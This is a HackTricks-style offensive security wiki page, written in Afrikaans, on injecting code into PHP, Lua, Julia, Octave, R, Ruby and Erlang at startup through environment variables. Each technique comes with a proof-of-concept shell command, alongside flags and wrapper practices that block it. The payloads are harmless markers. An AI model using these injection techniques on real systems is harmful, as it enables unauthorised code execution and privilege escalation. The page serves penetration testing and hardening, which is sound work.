# macOS Interpreter Startup-inspuiting via Omgewingsveranderlikes

{{#include ../../../banners/hacktricks-training.md}}

Hierdie runtime-spesifieke tegnieke gebruik geërfde omgewingsveranderlikes om opstartkonfigurasie te kies, kode vooraf te laai of VM-vlae te verskaf voordat die bedoelde werklading begin. Sommige variante gebruik lêers; Lua en Erlang ondersteun ook die uitvoering van kode direk.

## PHP-opstartkonfigurasie

### `PHPRC` / `PHP_INI_SCAN_DIR` en `auto_prepend_file`

PHP CLI en CGI lees konfigurasie met elke aanroep. `PHPRC` kan ’n aanvaller-leesbare `php.ini` kies, terwyl `PHP_INI_SCAN_DIR` die gids waar bykomende `.ini`-lêers geskandeer word, kan herlei. Die `auto_prepend_file`-direktief laat PHP ’n lêer ontleed voordat die aangevraagde script uitgevoer word, dus lei hierdie kombinasie tot kode-uitvoering tydens opstart.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
cat >/tmp/php-payload.php <<'PHP'
<?php file_put_contents('/tmp/php-prepend-executed', 'ok'); ?>
PHP
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/attacker-php.ini

PHPRC=/tmp/attacker-php.ini php victim.php
```

’n Alternatief is ’n gids wat ’n `.ini`-lêer bevat:

```bash
mkdir -p /tmp/php-conf.d
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/php-conf.d/99-prepend.ini
PHP_INI_SCAN_DIR=/tmp/php-conf.d php victim.php
```

Die `-n`-opsie ignoreer `php.ini`; ’n eksplisiete vertroude `-c`-pad geniet voorrang bo `PHPRC`. Onthou dat ’n langlewende bediener-SAPI gewoonlik die konfigurasie lees wanneer die webbediener begin, terwyl CLI en CGI dit met elke aanroep doen.<sup>[[1]](#references)</sup>

## Lua-opstartkode

### `LUA_INIT`

Voordat die selfstandige Lua-tolk opdragreëlopsies of die teikenskrip verwerk, voer dit `LUA_INIT_<major>_<minor>` uit, of, as die weergawe-spesifieke veranderlike ontbreek, `LUA_INIT`. ’n Waarde wat met `@` begin, dui ’n lêer aan; enige ander waarde word direk as Lua-kode geëvalueer. Dit maak opstartuitvoering moontlik met of sonder ’n lêer.<sup>[[3]](#references)</sup>

```bash
# File-backed
echo 'os.execute("touch /tmp/lua-init-executed")' >/tmp/lua-init.lua
LUA_INIT_5_4=@/tmp/lua-init.lua lua victim.lua

# Fileless
LUA_INIT='os.execute("touch /tmp/lua-inline-executed")' lua victim.lua
```

Die presiese weergawe-bepaalde naam verander na gelang van die interpreter, byvoorbeeld `LUA_INIT_5_4`. `lua -E` ignoreer alle omgewingsveranderlikes, insluitend opstartkode en Lua-modulepaaie.

## Julia-opstartdepot

### `JULIA_DEPOT_PATH` en `startup.jl`

Julia voer gewoonlik by opstart `config/startup.jl` vanaf sy eerste depot uit. `JULIA_DEPOT_PATH` beheer die depotlys, dus herlei dit die outomaties gelaaide opstartlêer wanneer dit na ’n boomstruktuur wys waartoe die aanvaller leestoegang het.<sup>[[4]](#references)[[5]](#references)</sup>

```bash
mkdir -p /tmp/julia-depot/config
echo 'run(`touch /tmp/julia-startup-executed`)' >/tmp/julia-depot/config/startup.jl

# A trailing empty entry expands to Julia's default depots.
JULIA_DEPOT_PATH=/tmp/julia-depot: julia victim.jl
```

Die afsluitende skeidingsteken is nuttig wanneer die slagoffer steeds sy normale pakkette nodig het. `julia --startup-file=no` deaktiveer hierdie opstartlêer. Vee die veranderlike uit voordat jy dit begin, want dit beheer ook pakketregisters, omgewings, kasgeheues en kode-laaiplekke.

## GNU Octave-opstartlêers

### `OCTAVE_SITE_INITFILE` / `OCTAVE_VERSION_INITFILE`

GNU Octave voer tydens opstart verskeie lêers met geldige Octave-opdragte uit. `OCTAVE_SITE_INITFILE` oorheers die werfwye opstartlêer en `OCTAVE_VERSION_INITFILE` oorheers die weergawe-spesifieke een, sodat enige van die veranderlikes outomatiese uitvoering na ’n lêer wat vir ’n aanvaller leesbaar is, kan herlei.<sup>[[6]](#references)</sup>

```bash
cat >/tmp/octave-startup.m <<'OCTAVE'
system('touch /tmp/octave-startup-executed');
OCTAVE

OCTAVE_SITE_INITFILE=/tmp/octave-startup.m octave-cli --quiet victim.m
```

`--no-init-file` slaan slegs gebruikerlêers soos `~/.octaverc` oor; dit keer **nie** die bogenoemde site-lêer-override nie. Gebruik `--no-site-file` vir die site-lêers of `--norc` / `-f` om alle opstartlêers te deaktiveer.<sup>[[7]](#references)</sup>

## R-opstartprofiele en pakketlaai

### `R_PROFILE_USER` / `R_PROFILE`

Met opstart voer R site- en gebruikerprofiel-lêers uit wat R-kode bevat. `R_PROFILE` kies die site-profiel en `R_PROFILE_USER` kies die gebruikerprofiel, wat ’n geërfde omgewing toelaat om enige van die opsoekaksies na ’n aanvaller-leesbare lêer te herlei.<sup>[[8]](#references)</sup>

```bash
echo 'file.create("/tmp/r-profile-executed")' >/tmp/attacker.Rprofile
R_PROFILE_USER=/tmp/attacker.Rprofile Rscript victim.R
```

`--no-init-file` slaan die gebruikersprofiel oor, `--no-site-file` slaan die werfprofiel oor, en `--vanilla` sluit albei beskermings in. R verwerk eers omgewingslêers wat deur `R_ENVIRON` en `R_ENVIRON_USER` gekies is, maar dié lêers stel net veranderlikes in; die profielveranderlikes is die direkte primitief vir arbitrêre kode-uitvoering.

### `R_DEFAULT_PACKAGES` / `R_SCRIPT_DEFAULT_PACKAGES` en biblioteekpaaie

R heg die kommageskeide packages in `R_DEFAULT_PACKAGES` tydens die opstart aan. `Rscript` gee voorkeur aan `R_SCRIPT_DEFAULT_PACKAGES`. Deur een van dié veranderlikes met `R_LIBS`, `R_LIBS_USER` of `R_LIBS_SITE` te kombineer, kan R ’n aanvallerbeheerde geïnstalleerde package vind en laai; die `.onLoad`- of `.onAttach`-hook daarvan word outomaties uitgevoer.<sup>[[8]](#references)[[9]](#references)</sup>

```bash
# Assume an installed package named htpayload exists below /tmp/r-library.
R_LIBS_USER=/tmp/r-library \
R_DEFAULT_PACKAGES=htpayload \
R --no-save --no-restore --silent

R_LIBS_USER=/tmp/r-library \
R_SCRIPT_DEFAULT_PACKAGES=htpayload \
Rscript victim.R
```

Dit vereis 'n struktureel geldige geïnstalleerde R-pakket, nie bloot 'n los `.R`-lêer nie. `--vanilla` maak nie direkte geërfde veranderlikes skoon nie, dus moet 'n vertroude wrapper die verstekpakket- en biblioteekpadveranderlikes ook unset of vervang, benewens die deaktivering van profiel-lêers.

## Ruby-loaderopsies

### RUBYOPT

Ruby ontleed ondersteunde commandoreëlskakelaars uit die `RUBYOPT`-omgewingsveranderlike voordat dit 'n script uitvoer. Ruby verwerp kode-uitvoering via `-e` in `RUBYOPT`, maar `-I` kan 'n biblioteeksoekgids vooraan plaas en `-r` kan 'n biblioteek vereis. 'n Proses wat Ruby met aanvallerbeheerde omgewingsveranderlikes begin, kan dus gedwing word om aanvallerbeheerde Ruby-kode te laai.<sup>[[10]](#references)</sup>

Skep `/tmp/inject.rb`:

```ruby:inject.rb
puts `whoami`
```

Skep 'n onskadelike Ruby-skrip soos `hello.rb`:

```ruby:hello.rb
puts 'Hello, World!'
```

Voer dit uit met ’n beheerde `RUBYOPT`-waarde:

```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```

Om hierdie gedrag te deaktiveer, spesifiseer `--disable=rubyopt` (of `--disable-rubyopt`) **voor** die skrifnaam:<sup>[[10]](#references)</sup>

```bash
RUBYOPT="-I/tmp -rinject" ruby --disable=rubyopt hello.rb
```

’n Opsie wat ná `hello.rb` geskryf word, word in `ARGV` aan die script deurgegee; dit skakel nie Ruby se vroeëre verwerking van `RUBYOPT` uit nie.<sup>[[10]](#references)</sup>

```bash
# This still loads /tmp/inject.rb because --disable-rubyopt is an argument to hello.rb.
RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
```

### RUBYLIB

In plaas daarvan om die laaigids met `-I` binne `RUBYOPT` vooraan te plaas, voeg die afsonderlike `RUBYLIB`-omgewingsveranderlike gidse by Ruby se `$LOAD_PATH`. In kombinasie met `RUBYOPT=-r<module>` laai dit aanvallerkode sonder dat `-I` in `RUBYOPT` nodig is:<sup>[[10]](#references)</sup>

```bash
echo "puts \`whoami\`" > /tmp/inject.rb
RUBYLIB=/tmp RUBYOPT=-rinject ruby hello.rb
```

## Erlang- en Elixir-VM-vlae

### `ERL_AFLAGS`, `ERL_FLAGS`, en `ERL_ZFLAGS`

Die `erl`-lanseerder voeg `ERL_AFLAGS` aan die begin van sy opdragreël by en `ERL_FLAGS` / `ERL_ZFLAGS` aan die einde. Omdat `-eval` ’n Erlang-uitdrukking tydens VM-inisialisering evalueer, kan hierdie veranderlikes lêerlose kode-uitvoering verskaf voordat die beoogde werklas begin.<sup>[[11]](#references)</sup>

```bash
ERL_AFLAGS="-noshell -eval 'file:write_file(\"/tmp/erl-aflags-executed\", <<\"ok\">>).' -s init stop" erl
```

Elixir, Mix, Phoenix en baie Elixir-vrystellings begin uiteindelik die Erlang VM en kan hierdie vlae erf. Bevestig die presiese release-wrapper: dit kan VM-argumente herbou of skoonmaak, terwyl sommige gereedskap `ERL_AFLAGS`, `ERL_ZFLAGS` of `ELIXIR_ERL_OPTIONS` uitdruklik ondersteun.<sup>[[12]](#references)</sup>

Anders as die meeste lêergebaseerde tegnieke, benodig die `-eval`-payload geen lêer wat deur die aanvaller beheer word nie. ’n Betroubare wrapper behoort al drie Erlang-vlagveranderlikes (en `ELIXIR_ERL_OPTIONS` vir Elixir) skoon te maak voordat die runtime begin; moenie probeer om individuele VM-vlae toe te laat nie, tensy die parser en volgorde ten volle verstaan word nie.

## References

- [1] [PHP-konfigurasielêer](https://www.php.net/manual/en/configuration.file.php)
- [2] [PHP `auto_prepend_file`](https://www.php.net/manual/en/ini.core.php#ini.auto-prepend-file)
- [3] [Lua 5.4-selfstandige interpreter](https://www.lua.org/manual/5.4/manual.html#7)
- [4] [Julia-opdragreël-koppelvlak: Opstartlêer](https://docs.julialang.org/en/v1/manual/command-line-interface/#Startup-file)
- [5] [Julia-omgewingsveranderlikes: `JULIA_DEPOT_PATH`](https://docs.julialang.org/en/v1/manual/environment-variables/#JULIA_DEPOT_PATH)
- [6] [GNU Octave-opstartlêers](https://docs.octave.org/latest/Startup-Files.html)
- [7] [GNU Octave-opdragreëlopsies](https://docs.octave.org/latest/Command-Line-Options.html)
- [8] [Initialisering aan die begin van ’n R-sessie](https://stat.ethz.ch/R-manual/R-devel/library/base/html/Startup.html)
- [9] [R-installasie en -administrasie: Byvoegingspakkette](https://stat.ethz.ch/CRAN/doc/manuals/r-release/R-admin.html)
- [10] [Ruby-dokumentasie - Ruby-opdragreëlopsies](https://ruby-doc.org/3.4/ruby/options_md.html)
- [11] [`erl`-opdrag en omgewingsveranderlikes](https://www.erlang.org/doc/apps/erts/erl_cmd.html)
- [12] [Elixir-releases en VM-omgewingsopsies](https://hexdocs.pm/elixir/releases.html#operating-system-scripts)
{{#include ../../../banners/hacktricks-training.md}}
